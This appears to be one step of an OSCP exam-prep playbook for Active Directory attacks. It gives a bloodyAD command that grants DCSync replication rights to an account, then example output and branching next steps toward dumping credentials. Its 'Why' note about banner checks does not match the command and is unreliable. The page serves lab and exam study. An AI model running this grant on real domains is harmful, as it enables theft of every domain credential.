# AD - DCSync Grant

**Step 47 of 50 · AD**

*Grant replication rights to the controlled account when the delegated ACL path allows it.*

## Run this

> **Why:** This version or banner check identifies the exact product release before a matching public exploit is considered.
```bash
bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2
```

## Example output

```

[+] Added DCSync rights for username2
[+] The account can replicate directory changes
```
## What did you get?

- [ ] bloodyAD confirms DCSync rights → **Go to Step 48 · [[AD - DCSync Dump]]**
- [ ] The account lacks permission → **Return to Step 46 · [[AD - Account Operators Abuse]] or Step 45 · [[AD - BloodHound]]**
- [ ] The command fails because the account cannot authenticate → **Run `netexec ldap $BoxIP -u $Username -p $Password`, then go to Step 40 · [[AD - Credential Validation]]**

## Notes

This page is for an ACL grant path. If the service account already has replication rights, skip directly to [[AD - DCSync Dump]].

## Gotcha

> [!warning] 💡
> Direct DCSync rights are possible. Always test the existing service account before building an Account Operators chain.
## Seen in
- *(no write-up yet)*

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
